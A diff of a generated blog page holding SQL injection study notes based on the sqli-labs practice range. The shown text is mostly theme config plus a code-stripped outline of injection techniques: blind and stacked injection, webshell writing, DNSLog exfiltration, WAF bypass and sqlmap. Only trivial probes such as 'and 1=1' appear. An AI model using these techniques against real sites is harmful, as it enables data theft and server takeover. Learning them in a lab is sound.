@@ -1,4 +1,4 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>SQL 注入学习笔记 | cHr1s's bolg</title><meta name="keywords" content="study,sql注入,web安全"><meta name="author" content="cHr1s"><meta name="copyright" content="cHr1s"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="SQL 注入学习笔记"><meta name="application-name" content="SQL 注入学习笔记"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="SQL 注入学习笔记"><meta property="og:url" content="http://example.com/2026/05/14/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/index.html"><meta property="og:site_name" content="cHr1s's bolg"><meta property="og:description" content="SQL 注入学习笔记     SQL 注入学习笔记基于sqli-libs靶场的学习记录  联合查询1. 判断是否存在 SQL 注入使用单引号 &amp;#39; 或其他闭合符号测试。 2. 判断闭合字符12and 1&amp;#x3D;1and 1&amp;#x3D;2  3. 判断列数12order by Ngroup by N  4."><meta property="og:locale" content="zh-CN"><meta property="og:image" content="http://example.com/cover/sql.png"><meta property="article:author" content="cHr1s"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="http://example.com/cover/sql.png"><meta name="description" content="SQL 注入学习笔记     SQL 注入学习笔记基于sqli-libs靶场的学习记录  联合查询1. 判断是否存在 SQL 注入使用单引号 &amp;#39; 或其他闭合符号测试。 2. 判断闭合字符12and 1&amp;#x3D;1and 1&amp;#x3D;2  3. 判断列数12order by Ngroup by N  4."><link rel="shortcut icon" href="/favicon.svg"><link rel="canonical" href="http://example.com/2026/05/14/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@6.1.6/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/swiper/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>SQL 注入学习笔记 | cHr1s's bolg</title><meta name="keywords" content="study,sql注入,web安全"><meta name="author" content="cHr1s"><meta name="copyright" content="cHr1s"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="SQL 注入学习笔记"><meta name="application-name" content="SQL 注入学习笔记"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="SQL 注入学习笔记"><meta property="og:url" content="http://example.com/2026/05/14/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/index.html"><meta property="og:site_name" content="cHr1s's bolg"><meta property="og:description" content="SQL 注入学习笔记     SQL 注入学习笔记基于sqli-libs靶场的学习记录  SQL 注入概述定义SQL 注入是一种将 SQL 代码插入或添加到应用（用户）的输入参数中，再将这些参数传递给后台 SQL 服务器加以解析并执行。如果 Web 应用未对动态构造的 SQL 语句所使用的参数进行"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="http://example.com/cover/sql.png"><meta property="article:author" content="cHr1s"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="http://example.com/cover/sql.png"><meta name="description" content="SQL 注入学习笔记     SQL 注入学习笔记基于sqli-libs靶场的学习记录  SQL 注入概述定义SQL 注入是一种将 SQL 代码插入或添加到应用（用户）的输入参数中，再将这些参数传递给后台 SQL 服务器加以解析并执行。如果 Web 应用未对动态构造的 SQL 语句所使用的参数进行"><link rel="shortcut icon" href="/favicon.svg"><link rel="canonical" href="http://example.com/2026/05/14/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@6.1.6/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/swiper/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
   linkPageTop: undefined,
   peoplecanvas: {"enable":true,"img":"images/loading.gif"},
   postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
@@ -55,12 +55,12 @@
   configTitle: 'cHr1s\'s bolg',
   title: 'SQL 注入学习笔记',
   postAI: '',
-  pageFillDescription: 'SQL 注入学习笔记, 联合查询, 1. 判断是否存在 SQL 注入, 2. 判断闭合字符, 3. 判断列数, 4. 确定回显位置, 5. 查询数据库, 6. 查询表名, 7. 查询字段名, 8. 查询数据, 报错注入, extractvalue, updatexml, limit x2F substr 限制输出, 布尔盲注, 常用函数, 求数据库长度, 逐字母爆破, 完整示例：security 库, 库长度, 库名第一位, 查表数量, 第一个表长度, 第一个表第一位字母, 第二个表第一位字母, 查 emails 表字段数量, 查第一个字段长度, 截取第一个字段第一位, 时间盲注, 常用函数, 求数据库长度, 逐字母爆破数据库名, 完整示例：security 库, 库长度, 库名第一位, 查表数量, 第一个表长度, 第一个表第一位字母, 查 emails 表字段数量, 截取第一个字段第一位, sqlmap 使用, 基本检测, 获取数据库, 获取表, 获取字段, 获取数据, 常用参数注入学习笔记注入学习笔记基于靶场的学习记录联合查询判断是否存在注入使用单引号或其他闭合符号测试判断闭合字符判断列数确定回显位置查询数据库查询表名查询字段名查询数据报错注入参数参数参数填入作为占位符原本这里应该放文档对象参数填入先执行查出当前数据库名拼接为参数参数参数与极其相似只是多了一个参数参数填入作为占位符原本的文档对象参数填入制造非法的路径参数填入作为占位符原本是要更新成的新值限制输出可使用一条一条查询也可使用进行截取控制起始与结束位置布尔盲注常用函数函数作用返回字符串的码位置从开始返回字符串的长度返回从开始的位从开始和功能一致从开始求数据库长度逐字母爆破等价于完整示例库库长度库名第一位查表数量第一个表长度第一个表第一位字母第二个表第一位字母查表字段数量查第一个字段长度截取第一个字段第一位时间盲注当页面没有明显的正确错误回显差异时利用条件构造时间延迟根据响应时间判断条件是否成立常用函数函数作用条件为真返回为假返回延迟秒返回从开始的位从开始和功能一致从开始返回字符串的码求数据库长度页面延迟秒说明数据库长度为逐字母爆破数据库名等价于完整示例库库长度库名第一位查表数量第一个表长度第一个表第一位字母查表字段数量截取第一个字段第一位与布尔盲注的关系时间盲注本质上是布尔盲注的延伸只需将布尔条件包裹在条件中即可后续猜解列名获取数据的步骤完全一致不再赘述使用基本检测检测是否存在注入获取数据库列出所有数据库获取当前数据库获取表列出指定数据库的所有表获取字段列出指定表的所有字段获取数据导出指定表的所有数据常用参数参数作用指定目标枚举所有数据库获取当前数据库名指定数据库指定表枚举字段导出数据使用默认选项无需交互确认设置检测等级默认设置风险等级默认指定注入技术布尔盲注时间盲注报错注入联合查询堆叠查询获取操作系统需满足条件指定方式提交数据使用绕过脚本如绕过空格过滤',
+  pageFillDescription: 'SQL 注入学习笔记, SQL 注入概述, 定义, Web 页面类型, 动态网站工作流程, SQL 注入起源, SQL 注入典型攻击手段, SQL 注入危害, SQL 注入分类, 按注入点类型, 按数据提交方式, 按执行效果, SQL 注入常用函数, MySQL 系统信息函数, 字符串操作函数, 注释方式, 联合查询, 1. 判断是否存在 SQL 注入, 2. 判断闭合字符, 3. 判断列数, 4. 确定回显位置, 5. 查询数据库, 6. 查询表名, 7. 查询字段名, 8. 查询数据, 报错注入, extractvalue, updatexml, 报错注入示例（完整 URL）, limit x2F substr 限制输出, 布尔盲注, 常用函数, 本地测试示例, 求数据库长度, 逐字母爆破, 完整示例：security 库, 库长度, 库名第一位, 查表数量, 第一个表长度, 第一个表第一位字母, 第二个表第一位字母, 查 emails 表字段数量, 查第一个字段长度, 截取第一个字段第一位, 时间盲注, 核心：if() + sleep(), 常用函数, 求数据库长度, 逐字母爆破数据库名, 完整示例：security 库, 库长度, 库名第一位, 查表数量, 第一个表长度, 第一个表第一位字母, 查 emails 表字段数量, 截取第一个字段第一位, 堆叠查询, 原理, 判断闭合, 查库查表, 插入数据, 删除数据, 修改数据, 读写文件（需 secure_file_priv 允许）, 各 Less 闭合方式, 宽字节注入, 背景, 原理, 判断闭合, 验证注入, 判断列数, 确定回显位, 爆库, 爆表, 脱库, 通用绕过字符, 各 Less 对应, POST 注入, 特点, 万能密码, Less-11：POST 联合查询（’ 闭合）, 判断闭合, 判断列数, 确定回显位, 爆表, 爆列名, 脱库, Less-12：) 闭合, Less-13：39) 闭合 — 无回显用报错注入, Less-14： 闭合 — 无回显, Less-15：布尔盲注, Less-16：) 闭合 + 布尔盲注, Less-17：UPDATE 注入（改密码处）, POST 注入工具速查, Cookie 注入, Cookie 是什么, Cookie 注入识别步骤, 特点, 判断闭合, 查数据库, 脱库, sqlmap 注入 Cookie, HTTP 头注入, 原理, HTTP 请求头结构, 常见注入头字段, Less-18：User-Agent 注入, 判断闭合, 报错注入（and 闭合方式）, 另一种写法（or + 注释）, 脱库, Less-19：Referer 注入, 判断闭合, 报错注入, 脱库, 常见 HTTP 头注入点, , 二次注入, 原理, 读写文件, 前置条件, 读文件：load_file(), 写文件：into outfile, outfile 与 dumpfile 的区别, 写入路径, DNSLog 外带查询, 原理, 示例, WAF 绕过, 常见绕过方式, 等价函数速查, 特殊注释绕过（Less-23 示例）, 空格绕过（Less-26 示例）, 绕狗实战思路, SQL 注入防御, 代码层防御, 架构层防御, 宽字节注入特防, sqlmap 基础, 基本检测, 获取数据库, 获取表, 获取字段, 获取数据, 常用参数注入学习笔记注入学习笔记基于靶场的学习记录注入概述定义注入是一种将代码插入或添加到应用用户的输入参数中再将这些参数传递给后台服务器加以解析并执行如果应用未对动态构造的语句所使用的参数进行正确性审查那么攻击者就很可能修改后台语句的构造一旦攻击者能够修改语句该语句将拥有与应用用户相同的运行权限页面类型类型特点安全性静态网页不依赖数据库灵活性差交互性差安全不存在注入动态网页等依赖数据库灵活交互性强维护方便存在注入风险伪静态网页伪装通过重写隐藏动态参数本质仍是动态测试时可直接对前参数加判断动态网站工作流程客户端请求如脚本引擎动态构造数据库返回数据生成静态页返回客户端注入起源程序员水平和经验欠缺对注入没有防范意识许多教程或模板存在注入漏洞网上给出的许多解决办法并未从根本上解决问题数据库管理员对数据库权限设置不合理注入典型攻击手段判断应用程序是否存在注入漏洞收集信息判断数据库类型根据注入参数类型重构语句原貌猜解当前库名表名字段名查询数据获取账户信息攻击或为下一步攻击做准备注入危害数据库信息泄漏网页篡改数据库被恶意操作增删改服务器被远程控制种植木马写入注入分类按注入点类型类型形式数字型字符型搜索型按数据提交方式类型说明注入注入点在参数部分注入注入点在请求体中常发生在表单注入注入点在的某个字段中头注入注入点在等头部字段按执行效果类型特点联合查询注入使用合并查询结果页面直接回显报错注入页面返回数据库错误信息借助报错函数回显布尔盲注无回显无报错根据页面返回判断时间盲注无任何差异利用构造时间延迟判断堆叠查询同时执行多条语句注入常用函数系统信息函数函数作用当前用户名当前数据库名当前用户名可查看权限数据库版本数据库存储路径操作系统版本查看文件读写权限字符串操作函数函数作用连接字符串多个参数连接字符串能将同列多行组合为一行返回字符串长度字符转换为十六进制返回字符串第一个字符的码注释方式注释类型语法说明单行注释内容后直接加内容单行注释内容后必须加空格多行注释中间可跨行内联注释特有可绕过表示版本时执行联合查询判断是否存在注入使用单引号或其他闭合符号测试判断闭合字符不同类型闭合的判断方式数字型正常异常单引号字符型异常闭合符号为正常异常双引号字符型异常闭合符号为正常异常括号双引号型异常闭合符号为正常异常本质先加测试报错说明存在注入再根据报错信息或确定具体闭合字符判断列数内部的语句必须拥有相同数量的列列也须拥有相似的数据类型且列的顺序必须相同从递增正常异常的分界点即为列数同上示例正常异常共列确定回显位置因为并非所有列都会被页面显示需找出实际被使用的列然后在对应位置插入页面回显和则回显位为第列查询数据库查询表名查询字段名查询数据报错注入参数文档对象的名称注入时填入作为占位符参数格式的字符串注入时写入错误的格式如触发报错显示信息参数文档对象的名称占位填入参数格式字符串制造非法路径触发报错参数替换查找到的符合条件数据占位填入报错注入示例完整查版本查当前数据库查当前用户限制输出可使用一条一条查询也可使用进行截取控制起始与结束位置布尔盲注当页面存在注入但没有显示位没有数据库报错信息时只能通过页面返回正常异常进行判断此时需要布尔盲注常用函数函数作用返回字符串的码位置从开始返回字符串的长度汉字算字符数字字母算返回从开始的位从开始和功能一致从开始返回左边个字符返回左边个字符判断查询是否有结果返回码参考数字大写小写使用比较可二分法加速爆破先判断再精确本地测试示例判断是否存在截取第一位获取第三位比较判断缩小范围求数据库长度逐字母爆破等价于完整示例库库长度库名第一位查表数量第一个表长度第一个表第一位字母第二个表第一位字母查表字段数量查第一个字段长度截取第一个字段第一位时间盲注当页面没有异常无回显无报错信息时只能利用条件语句结合执行时间的长短判断是否正确核心条件条件为真时的返回值条件为假时的返回值延迟秒判断逻辑条件为真时执行产生延迟为假时直接返回根据响应时间判断条件是否成立常用函数函数作用条件为真返回为假返回延迟秒返回从开始的位从开始和功能一致从开始返回字符串的码求数据库长度页面延迟秒说明数据库长度为逐字母爆破数据库名等价于完整示例库库长度库名第一位查表数量第一个表长度第一个表第一位字母查表字段数量截取第一个字段第一位与布尔盲注的关系时间盲注本质上是布尔盲注的延伸只需将布尔条件包裹在条件中即可后续猜解列名获取数据的步骤完全一致不再赘述堆叠查询原理中支持一次执行多条语句用分隔如果后端未过滤攻击者可在正常语句后追加任意与的区别堆叠可执行等任意语句只能追加判断闭合报错闭合方式为以为例查库查表查所有数据库查库的表查表的列插入数据向表插入一条新记录之后可用登录验证插入成功删除数据数字型无闭合符号直接堆叠修改数据修改管理员密码读写文件需允许写一句话木马读系统文件注意为时禁止读写为空时可任意路径执行查看各闭合方式闭合方式请求方式说明单引号闭合无数字型无需引号括号单引号无数字型无闭合型堆叠型堆叠无回显需配合时间盲注验证无回显需配合时间盲注验证防御使用而非使用预处理语句宽字节注入背景当某字符大小为字节时称窄字节英文数字字节时称宽字节中文等常见宽字节编码编码规则第一个字节即时与下一字符合并为一个汉字原理使用或开启时被转义为编码利用编码在前拼接一个的字节吃掉反斜杠输入后对加了转义解析一个汉字单独作为逃逸最终效果汉字单引号成功逃逸核心吃掉让转义符失效判断闭合报错闭合方式为宽字节注入有效验证注入正常回显说明条件生效判断列数报错共列确定回显位回显和爆库爆表脱库通用绕过字符不止只要首字节即可说明最常用同样可行同上宽字节范围下限附近宽字节范围上限附近各对应注入方式请求方式说明过滤型宽字节型注意同样能被宽字节绕过防御使用预处理设置连接字符集而非统一使用编码注入特点从起注入点从的参数变为请求体注入原理与型完全相同区别仅在于数据提交位置后端大致为可用抓包重放或用插件的模式万能密码回显第一位用户的场景下注释掉密码验证任意永真条件闭合任意联合查询覆盖任意万能密码大全练习序号联合查询闭合判断闭合报错闭合方式为判断列数正常共列确定回显位回显爆表爆列名脱库闭合闭合无回显用报错注入报错注入时间盲注闭合无回显布尔盲注无报错回显通过登录成功失败判断判断数据库长度逐字爆破闭合布尔盲注注入改密码处注入点在字段做了过滤后端新密码注入工具速查工具操作方式抓包修改调出勾选填入参数注入是什么是在协议下服务器或脚本可以维护客户工作站上信息的一种方式通常用于辨别用户身份进行跟踪最典型的应用是保存用户账号密码用来自动登录以及电商网站的购物车注入识别步骤寻找形如的带参数去掉参数测试页面是否仍正常验证参数是否通过传递测试应用是否用获取数据同时接受将注入语句带入和常规注入一样分别返回正常异常则存在注入使用常规注入语句进行注入特点注入点在请求头的字段中登录后后端会从的字段取值拼入判断闭合报错发现后缀闭合方式为且末尾有需用注释查数据库脱库注入要点注入与注入原理相同区别在于注入点位置需注意用注释掉原语句尾部的头注入原理部分应用会将请求头等的值写入数据库通常是语句如果未过滤直接拼接就存在注入点请求头结构常见注入头字段头名称说明浏览器标识常被记录到数据库日志来源页常被记录独立一类见注入章节客户端代理场景可能直接入库客户端真实客户端早期字段目标主机的应用扫描器不能发现参数的相关漏洞注入登录后后端将写入语句判断闭合报错闭合方式为两端各一个单引号包裹报错注入闭合方式前后用闭合原有引号中间用连接即最终拼接为另一种写法注释脱库注入登录后页面回显注入点在头判断闭合报错闭合方式为报错注入同样用两端的闭合原语句中间注入报错函数脱库常见头注入点头名称说明浏览器标识常被记录到访问日志或数据库来源页常被记录客户端代理场景可能未过滤直接入库客户端真实独立一类见注入章节与的共同点注入点都在请求头后端将其写入语句由于通常无直接回显一般使用报错注入二次注入原理二次注入分为两步第一步插入恶意数据第一次向数据库插入数据时仅对特殊字符进行了转义写入数据库时保留了原始恶意数据第二步引用恶意数据数据存入数据库后开发者认为数据是可信的再次查询时直接从数据库取出恶意数据没有做进一步检验和处理导致注入关键在于信任边界数据入库时做了转义但仍保留了恶意内容后续使用时未再次过滤练习读写文件前置条件需要允许值含义禁止导入导出限制导入导出只能在目录空不限制导入导出查看当前配置读文件路径可用单引号字符串十六进制转换路径必须用不能用写文件后面不能接或转换的路径写文件时和都可以会被自动去掉一个与的区别特性导出行数可导出多行只能导出一行格式转换有特殊格式转换保持原数据格式适用场景文本文件二进制文件写入路径写入外带查询原理通过子查询将数据拼接到域名中使用访问共享文件域名被服务器记录从而将盲注变为显错注入在日志中直接看到数据示例成功时日志中会出现的解析记录直接读出数据库名绕过常见绕过方式方法原理示例大小写混合服务器端检测未开启大小写不敏感多重关键字双写服务端检测到敏感字替换为空编码绕过服务端未检测编码形式关键字注释绕过服务端未检测注释内的字符串等价函数黑名单不完整代替代替特殊符号数据库中效果相同服务端未限制科学记数法空白字符组合绕过多位置过滤需组合多种方式等价函数速查类别可替换函数报错查询字符串截取字符串连接字符串转换替换等号替换空格特殊注释绕过示例注释符被过滤时用闭合尾部空格绕过示例绕狗实战思路定位黑名单逐个测试关键字空格注释确定哪些被拦截爆破使用内联注释中的数字进行找出可绕过的版本号组合利用将大小写双写编码注释等多种方式组合内联注释示例爆破中间的数字注入防御代码层防御过滤特殊符号在预定义字符前加反斜杠正则过滤架构层防御分级管理严格控制用户权限普通用户禁止数据库增删改权限参数传值预编译禁止将变量直接拼入使用预处理基础过滤二次过滤先做基础过滤再根据业务场景做针对性二次过滤漏洞扫描使用专业扫描工具定期发现系统注入漏洞多层验证客户端和系统端都进行有效验证相互配合数据库信息加密对敏感数据采用加密存储宽字节注入特防指定连接字符集会考虑当前字符集不会出现宽字节拼接问题上述两个条件缺一不可基础详见使用基本检测检测是否存在注入获取数据库列出所有数据库获取当前数据库获取表列出指定数据库的所有表获取字段列出指定表的所有字段获取数据导出指定表的所有数据常用参数参数作用指定目标枚举所有数据库获取当前数据库名指定数据库指定表枚举字段导出数据使用默认选项无需交互确认设置检测等级默认设置风险等级默认指定注入技术布尔盲注时间盲注报错注入联合查询堆叠查询获取操作系统需满足条件指定方式提交数据使用绕过脚本如绕过空格过滤',
   isPost: true,
   isHome: false,
   isHighlightShrink: false,
   isToc: true,
-  postUpdate: '2026-05-14 20:02:12',
+  postUpdate: '2026-05-15 21:28:39',
   postMainColor: '',
 }</script><noscript><style type="text/css">
   #nav {
@@ -203,18 +203,250 @@ setTimeout(function(){preloader.endLoading();},10000)
 if (true) {
   document.addEventListener('pjax:send', () => { preloader.initLoading() })
   document.addEventListener('pjax:complete', () => { preloader.endLoading() })
-}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">cHr1s's bolg</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/air-conditioner/"><i class="anzhiyufont anzhiyu-icon-fan faa-tada" style="font-size: 0.9em;"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/basics/" style="font-size: 1.05rem;">basics<sup>3</sup></a><a href="/tags/ctf/" style="font-size: 1.05rem;">ctf<sup>4</sup></a><a href="/tags/hexo%E8%A3%85%E4%BF%AE%E6%97%A5%E8%AE%B0/" style="font-size: 1.05rem;">hexo装修日记<sup>2</sup></a><a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 1.05rem;">sql注入<sup>1</sup></a><a href="/tags/study/" style="font-size: 1.05rem;">study<sup>1</sup></a><a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">web安全<sup>4</sup></a><a href="/tags/wp/" style="font-size: 1.05rem;">wp<sup>1</sup></a><a href="/tags/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" style="font-size: 1.05rem;">刷题记录<sup>3</sup></a><a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 1.05rem;">杂项<sup>1</sup></a><a href="/tags/%E6%B5%8B%E8%AF%95/" style="font-size: 1.05rem;">测试<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2026/05/"><span class="card-archive-list-date">五月 2026</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/11/"><span class="card-archive-list-date">十一月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/06/"><span class="card-archive-list-date">六月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/04/"><span class="card-archive-list-date">四月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">6</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/11/"><span class="card-archive-list-date">十一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/study/" itemprop="url">study</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/study/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>study</span></a><a class="article-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>sql注入</span></a><a class="article-meta__tags" href="/tags/web%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>web安全</span></a></span></div></div><h1 class="post-title" itemprop="name headline">SQL 注入学习笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2026-05-14T01:09:22.000Z" title="发表于 2026-05-14 09:09:22">2026-05-14</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2026-05-14T12:02:12.979Z" title="更新于 2026-05-14 20:02:12">2026-05-14</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="SQL 注入学习笔记"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span 